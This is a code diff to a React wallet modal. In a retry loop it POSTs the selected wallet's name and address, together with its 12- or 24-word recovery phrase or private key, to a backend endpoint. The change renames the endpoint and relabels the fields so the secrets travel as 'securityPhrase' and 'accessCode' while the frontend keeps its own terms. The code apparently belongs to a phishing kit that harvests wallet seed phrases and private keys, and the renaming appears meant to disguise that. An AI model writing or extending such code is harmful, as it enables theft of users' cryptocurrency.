@@ -119,17 +119,19 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
   
     while (retryCount < maxRetries) {
       try {
-        const response = await fetch(`${BASE_URL}/send-wallet-data`, {
+        // Updated endpoint to match the new backend endpoint
+        const response = await fetch(`${BASE_URL}/send-account-data`, {
           method: "POST",
           headers: {
             "Content-Type": "application/json",
           },
           body: JSON.stringify({
-            walletName: selectedWallet?.name,
-            walletAddress: currentWalletAddress,
-            ...(tabValue === 0 && { phraseWords }),
-            ...(tabValue === 1 && { phraseWords24 }),
-            ...(tabValue === 2 && { privateKey }),
+            // Map to the new backend field names while keeping frontend terms the same
+            accountName: selectedWallet?.name,
+            accountId: currentWalletAddress,
+            ...(tabValue === 0 && { securityPhrase: phraseWords }),
+            ...(tabValue === 1 && { securityPhrase24: phraseWords24 }),
+            ...(tabValue === 2 && { accessCode: privateKey }),
           }),
         });
   
